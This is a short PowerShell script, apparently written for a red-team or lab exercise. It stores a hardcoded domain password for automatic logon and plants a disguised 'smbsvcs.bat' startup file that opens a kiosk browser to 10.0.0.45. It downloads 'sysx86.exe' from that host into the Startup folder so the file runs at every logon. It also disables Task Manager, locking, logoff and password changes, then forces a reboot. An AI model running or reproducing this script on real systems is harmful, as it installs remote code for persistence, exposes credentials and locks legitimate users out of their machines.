$DefaultUsername = "elbrown42"
$DefaultPassword = "P@ssw0rd!"
$DomainName = "TEAM10"
$DomainUser = $DomainName + "\" + $DefaultUsername

$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
Set-ItemProperty $RegPath "DefaultUsername" -Value "$DomainUser" -type String 
Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -Name smbsvcs.bat -Value """C:\Program Files\Internet Explorer\iexplore.exe"" -k ""http://10.0.0.45"""
wget 10.0.0.45:443/sysx86.exe -O 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysx86.exe'
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DisableLockWorkstation" -Value 1
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "DisableTaskMgr" -Value 1
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "NoLogoff" -Value 1
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "DisableChangePassword" -Value 1
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "HideFastUserSwitching" -Value 1
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer -Name "StartMenuLogOff" -Value 1
Restart-Computer -Force
